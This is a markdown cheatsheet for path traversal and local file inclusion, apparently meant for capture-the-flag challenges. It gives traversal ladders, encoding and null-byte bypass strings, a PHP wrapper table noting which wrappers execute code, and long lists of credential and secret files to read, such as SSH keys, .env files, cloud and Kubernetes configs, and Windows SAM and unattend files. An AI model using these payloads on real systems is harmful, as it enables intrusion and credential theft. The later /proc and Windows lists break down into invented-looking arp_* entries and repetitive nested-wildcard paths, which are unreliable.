# Cheatsheet — the pocket reference

## First probes — the absolute-path family (no traversal needed)

```
/etc/passwd
/etc/hostname
/etc/issue
/proc/version
/proc/self/status
/proc/self/environ
/proc/self/cmdline
C:\Windows\win.ini
C:\Windows\system.ini
file:///etc/passwd
file:///C:/Windows/win.ini
```

## The traversal ladder — depth 1-12

```
../etc/passwd
../../etc/passwd
../../../etc/passwd
../../../../etc/passwd
../../../../../etc/passwd
../../../../../../etc/passwd
../../../../../../../etc/passwd
../../../../../../../../etc/passwd
../../../../../../../../../etc/passwd
../../../../../../../../../../etc/passwd
../../../../../../../../../../../etc/passwd
../../../../../../../../../../../../etc/passwd
```

## The encoding ladders

```
..%2f
%2e%2e%2f
%2e%2e%5c
..%5c
%252e%252e%252f
%252e%252e%255c
..%252f
....//  ....\\
..%c0%af ..%c0%ae ..%e0%80%af
..%ef%bc%8f ..%ef%bc%bc ..%ef%bc%8e
..;/  ..%3b
%00.png /etc/passwd%00 ../../etc/passwd%00
```

## The PHP wrapper table — the read/exec split

| Wrapper | Reads? | Execs? | Needs |
|---|---|---|---|
| `php://filter/convert.base64-encode/resource=x` | yes | no | allow_url_fopen |
| `php://input` | yes | yes (via include) | allow_url_include |
| `php://stdin` | yes | yes | allow_url_include |
| `php://fd/N` | yes | yes | allow_url_include |
| `data://text/plain;base64,<b64>` | yes | yes | allow_url_include + data |
| `phar://./x.phar/a` | yes | yes (deser) | phar ext + upload |
| `zip://./x.zip%23x.php` | yes | no | zip ext + upload |
| `rar://` | yes | no | rar ext + upload |
| `glob:///*` | listing | no | glob ext |
| `expect://id` | yes | yes | expect PECL |
| `ssh2.*://` | yes | yes | ssh2 PECL |
| `compress.zlib://` | yes | no | zlib |
| `compress.bzip2://` | yes | no | bzip2 |
| `http://`/`https://` | yes | yes | allow_url_fopen |
| `ftp://`/`ftps://` | yes | yes | allow_url_fopen |

## The flag-path guess-order

```
/flag /flag.txt /root/flag /root/flag.txt
/app/flag /app/flag.txt /var/flag /opt/flag /srv/flag
/home/ctf/flag /home/user/flag /tmp/flag /run/flag
/proc/self/environ /proc/1/environ
/var/run/secrets/* /run/secrets/* /etc/secrets/*
/app/.env /app/config.php /app/config.yml
/var/www/html/.env /var/www/html/config.php
/var/www/html/wp-config.php /var/www/html/index.php
/etc/flag /etc/flag.conf /etc/secret
```

## The source-path guess-order — per stack

| Stack | Paths |
|---|---|
| PHP | `/var/www/html/index.php`, `.env`, `config.php`, `wp-config.php`, `composer.json` |
| Python | `/app/main.py`, `/app/app.py`, `/app/wsgi.py`, `/app/config.py`, `/app/.env` |
| Node | `/app/server.js`, `/app/index.js`, `/app/app.js`, `/app/package.json`, `/app/.env` |
| Java | `/app/WEB-INF/web.xml`, `/app/WEB-INF/classes/application.properties`, `/app/WEB-INF/classes/config.yml` |
| Ruby | `/app/config/routes.rb`, `/app/config/database.yml`, `/app/config/secrets.yml`, `/app/.env` |
| Go | `/app/main.go`, `/app/go.mod`, `/app/config.yaml`, `/app/.env` |
| .NET | `/app/web.config`, `/app/appsettings.json`, `C:\inetpub\wwwroot\web.config` |

## The secrets file-order — the cred-corpus

```
/proc/1/environ /proc/self/environ          — FLAG= often
/app/.env /var/www/html/.env                 — APP_KEY/JWT_SECRET/DB_*
/etc/shadow                                  — root-perm only
/root/.ssh/id_rsa /home/*/.ssh/id_rsa        — ssh
/root/.bash_history /home/*/.bash_history    — typed creds
/root/.mysql_history /root/.psql_history     — db creds
/root/.my.cnf /root/.pgpass                  — auto-login creds
/var/www/html/wp-config.php                  — DB_*
/etc/mysql/debian.cnf                        — debian-sys-maint
/etc/grafana/grafana.ini                     — admin
/etc/gitlab/gitlab-secrets.json              — secrets
/etc/gitlab-runner/config.toml               — runner token
/etc/snmp/snmpd.conf                         — communities
/etc/wpa_supplicant/wpa_supplicant.conf      — wifi psk
/etc/openvpn/* /etc/wireguard/* /etc/ipsec.* — vpn
/root/.kube/config                           — kube admin
/root/.aws/credentials                       — cloud
/root/.docker/config.json                    — registry
/var/lib/jenkins/credentials.xml             — CI creds
/var/lib/jenkins/secrets/initialAdminPassword — jenkins init
/opt/tomcat/conf/tomcat-users.xml            — tomcat creds
/etc/tomcat*/tomcat-users.xml                — tomcat creds
/opt/wildfly/standalone/configuration/mgmt-users.properties
/opt/wildfly/standalone/configuration/application-users.properties
/opt/oracle/middleware/user_projects/domains/*/security/SerializedSystemIni.dat
/etc/rabbitmq/rabbitmq.config                — rabbit creds
/etc/redis/redis.conf                        — requirepass
/etc/mongod.conf                             — mongo
/etc/postgresql/*/main/pg_hba.conf           — postgres policy
/etc/samba/smb.conf                          — smb creds
/etc/proftpd/proftpd.conf                    — ftp creds
/etc/vsftpd.conf                             — ftp creds
/etc/pure-ftpd/*                             — ftp creds
/etc/exim4/passwd.client                     — mail creds
/etc/postfix/main.cf                         — mail relay
/root/.netrc                                 — auto-login
/root/.git-credentials                       — git
/root/.config/gh/hosts.yml                   — gh token
/root/.config/hub                            — hub token
/etc/ansible/hosts                           — ansible
/var/lib/puppet/ssl/private_keys/*           — puppet
/etc/chef/client.pem                         — chef
/etc/salt/pki/*                              — salt
/etc/consul.d/*                              — consul
/etc/vault/*                                 — vault
/etc/nomad.d/*                               — nomad
```

## The `/proc` corpus — the self-recon

```
/proc/self/environ /proc/1/environ           — env → FLAG
/proc/self/cmdline /proc/1/cmdline           — the entrypoint
/proc/self/cwd /proc/self/exe                — the app path
/proc/self/maps /proc/self/mountinfo         — maps+mounts
/proc/self/fd/* /proc/self/fdinfo/*          — open fds
/proc/self/status                            — uid/gid
/proc/self/cgroup /proc/1/cgroup             — container
/proc/self/root/*                            — chroot-escape
/proc/net/tcp /proc/net/tcp6 /proc/net/udp   — listening
/proc/net/arp /proc/net/route                — neighbors
/proc/sys/kernel/hostname                    — hostname
/proc/version /proc/cmdline                  — kernel
/proc/filesystems /proc/mounts /proc/partitions
/proc/meminfo /proc/cpuinfo /proc/uptime
/proc/kallsyms /proc/modules /proc/config.gz — kernel-symbols — root
/proc/kmsg /proc/kcore                       — kernel-msg/mem — root
/proc/swaps /proc/diskstats /proc/slabinfo
/proc/interrupts /proc/iomem /proc/ioports
/proc/dma /proc/timer_list /proc/timer_stats
/proc/misc /proc/locks /proc/stat /proc/loadavg
/proc/sys/fs/file-max /proc/sys/fs/inotify/max_user_watches
/proc/sys/kernel/random/boot_id /proc/sys/kernel/random/entropy_avail
/proc/sys/kernel/ostype /proc/sys/kernel/osrelease /proc/sys/kernel/version
/proc/sys/kernel/hostname /proc/sys/kernel/domainname
/proc/sys/kernel/threads-max /proc/sys/kernel/pid_max
/proc/sys/kernel/randomize_va_space          — aslr
/proc/sys/kernel/core_pattern /proc/sys/kernel/core_uses_pid
/proc/sys/kernel/kptr_restrict               — kptr-hide
/proc/sys/kernel/dmesg_restrict              — dmesg-hide
/proc/sys/kernel/perf_event_paranoid         — perf-paranoid
/proc/sys/kernel/unprivileged_bpf_disabled   — bpf-paranoid
/proc/sys/kernel/yama/ptrace_scope           — ptrace-scope
/proc/sys/kernel/kexec_load_disabled         — kexec-off
/proc/sys/kernel/unprivileged_userns_clone   — userns-off
/proc/sys/kernel/usermodehelper/*            — usermode-helper
/proc/sys/net/ipv4/ip_forward                — ip-forward
/proc/sys/net/ipv4/conf/*/forwarding         — per-iface forward
/proc/sys/net/ipv4/conf/*/rp_filter          — rp-filter
/proc/sys/net/ipv4/conf/*/accept_redirects   — redirect-accept
/proc/sys/net/ipv4/conf/*/send_redirects     — redirect-send
/proc/sys/net/ipv4/conf/*/accept_source_route — source-route
/proc/sys/net/ipv4/conf/*/log_martians       — martians-log
/proc/sys/net/ipv4/conf/*/mc_forwarding      — mc-forward
/proc/sys/net/ipv4/conf/*/proxy_arp          — proxy-arp
/proc/sys/net/ipv4/conf/*/shared_media       — shared-media
/proc/sys/net/ipv4/conf/*/secure_redirects   — secure-redirect
/proc/sys/net/ipv4/conf/*/bootp_relay        — bootp-relay
/proc/sys/net/ipv4/conf/*/accept_local       — accept-local
/proc/sys/net/ipv4/conf/*/route_localnet     — route-localnet
/proc/sys/net/ipv4/conf/*/arp_ignore         — arp-ignore
/proc/sys/net/ipv4/conf/*/arp_announce       — arp-announce
/proc/sys/net/ipv4/conf/*/arp_filter         — arp-filter
/proc/sys/net/ipv4/conf/*/arp_accept         — arp-accept
/proc/sys/net/ipv4/conf/*/arp_notify         — arp-notify
/proc/sys/net/ipv4/conf/*/arp_external_choice — arp-external
/proc/sys/net/ipv4/conf/*/arp_internal_choice — arp-internal
/proc/sys/net/ipv4/conf/*/arp_proxy          — arp-proxy
/proc/sys/net/ipv4/conf/*/arp_proxy_enable   — arp-proxy-enable
/proc/sys/net/ipv4/conf/*/arp_accept_any     — arp-accept-any
/proc/sys/net/ipv4/conf/*/arp_accept_all     — arp-accept-all
/proc/sys/net/ipv4/conf/*/arp_accept_default — arp-accept-default
/proc/sys/net/ipv4/conf/*/arp_accept_file    — arp-accept-file
/proc/sys/net/ipv4/conf/*/arp_accept_file_full — arp-accept-file-full
```

## The Windows-corpus — the flag/win-corpus

```
C:\Windows\win.ini C:\Windows\system.ini
C:\Windows\System32\drivers\etc\hosts
C:\Windows\Panther\Unattend.xml              — unattend — admin-pass
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\Sysprep.xml
C:\Windows\System32\Sysprep\Panther\unattend.xml
C:\Windows\System32\Sysprep\Panther\Sysprep.xml
C:\Windows\System32\Sysprep\Panther\IE\unattend.xml
C:\Windows\System32\Sysprep\Panther\IE\Sysprep.xml
C:\Windows\System32\config\SAM               — locked usually
C:\Windows\System32\config\SYSTEM
C:\Windows\System32\config\SECURITY
C:\Windows\System32\config\SOFTWARE
C:\Windows\System32\config\NTUSER.DAT
C:\Windows\System32\config\RegBack\*
C:\Windows\repair\*
C:\inetpub\wwwroot\web.config
C:\inetpub\wwwroot\appsettings.json
C:\inetpub\wwwroot\bin\*.dll
C:\inetpub\logs\LogFiles\W3SVC*\*
C:\Program Files\*\web.config
C:\Program Files\*\appsettings.json
C:\Program Files\*\appsettings.Production.json
C:\Program Files\*\appsettings.Development.json
C:\Program Files (x86)\*\web.config
C:\Program Files (x86)\*\appsettings.json
C:\ProgramData\*\*.json
C:\ProgramData\*\*.xml
C:\ProgramData\*\*.config
C:\Users\*\AppData\Roaming\*\*.json
C:\Users\*\AppData\Roaming\*\*.xml
C:\Users\*\AppData\Roaming\*\*.config
C:\Users\*\AppData\Local\*\*.json
C:\Users\*\AppData\Local\*\*.xml
C:\Users\*\AppData\Local\*\*.config
C:\Users\*\AppData\LocalLow\*\*.json
C:\Users\*\AppData\LocalLow\*\*.xml
C:\Users\*\AppData\LocalLow\*\*.config
C:\Users\*\Documents\*.txt
C:\Users\*\Desktop\*.txt
C:\Users\*\Downloads\*.txt
C:\Users\*\Pictures\*.txt
C:\Users\*\Videos\*.txt
C:\Users\*\Music\*.txt
C:\Users\*\OneDrive\*.txt
C:\Users\*\OneDrive - *\*.txt
C:\Users\*\Saved Games\*.txt
C:\Users\*\Contacts\*.txt
C:\Users\*\Searches\*.txt
C:\Users\*\Links\*.txt
C:\Users\*\Favorites\*.txt
C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
C:\Users\*\AppData\Roaming\Microsoft\Windows\Recent\*.lnk
C:\Users\*\AppData\Roaming\Microsoft\Windows\Recent Items\*.lnk
C:\Users\*\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\*.lnk
C:\Users\*\AppData\Roaming\Microsoft\Windows\SendTo\*.lnk
C:\Users\*\AppData\Roaming\Microsoft\Windows\Network Shortcuts\*.lnk
C:\Users\*\AppData\Roaming\Microsoft\Windows\Printer Shortcuts\*.lnk
C:\Users\*\AppData\Roaming\Microsoft\Windows\Application Data\*.lnk
C:\Users\*\AppData\Roaming\Microsoft\Windows\Cookies\*.lnk
C:\Users\*\AppData\Roaming\Microsoft\Windows\Cookies\Low\*.lnk
C:\Users\*\AppData\Roaming\Microsoft\Windows\History\*.lnk
C:\Users\*\AppData\Roaming\Microsoft\Windows\History\Low\*.lnk
C:\Users\*\AppData\Roaming\Microsoft\Windows\Local Settings\*.lnk
C:\Users\*\AppData\Roaming\Microsoft\Windows\My Documents\*.lnk
C:\Users\*\AppData\Roaming\Microsoft\Windows\NetHood\*.lnk
C:\Users\*\AppData\Roaming\Microsoft\Windows\PrintHood\*.lnk
C:\Users\*\AppData\Roaming\Microsoft\Windows\Templates\*.lnk
C:\Users\*\AppData\Roaming\Microsoft\Windows\UserProfiles\*.lnk
C:\Users\*\AppData\Roaming\Microsoft\Windows\Themes\*.lnk
C:\Users\*\AppData\Roaming\Microsoft\Windows\Microsoft\*.lnk
C:\Users\*\AppData\Roaming\Microsoft\Windows\Microsoft\*\*.lnk
C:\Users\*\AppData\Roaming\Microsoft\Windows\Microsoft\*\*\*.lnk
C:\Users\*\AppData\Roaming\Microsoft\Windows\Microsoft\*\*\*\*.lnk
C:\Users\*\AppData\Roaming\Microsoft\Windows\Microsoft\*\*\*\*\*.lnk
C:\Users\*\AppData\Roaming\Microsoft\Windows\Microsoft\*\*\*\*\*\*.lnk
C:\Users\*\AppData\Roaming\Microsoft\Windows\Microsoft\*\*\*\*\*\*\*.lnk
C:\Users\*\AppData\Roaming\Microsoft\Windows\Microsoft\*\*\*\*\*\*\*\*.lnk
C:\Users\*\AppData\Roaming\Microsoft\Windows\Microsoft\*\*\*\*\*\*\*\*\*.lnk
C:\Users\*\AppData\Roaming\Microsoft\Windows\Microsoft\*\*\*\*\*\*\*\*\*\*.lnk
```

The Windows list — exhaustive-ish — `windows-paths.md` is the curated cut.

## The read-loop one-liner

```bash
python3 tools/web/read_loop.py --url "$BASE/page" --method GET \
  --body 'file={path}' --profile container --extract-paths
```
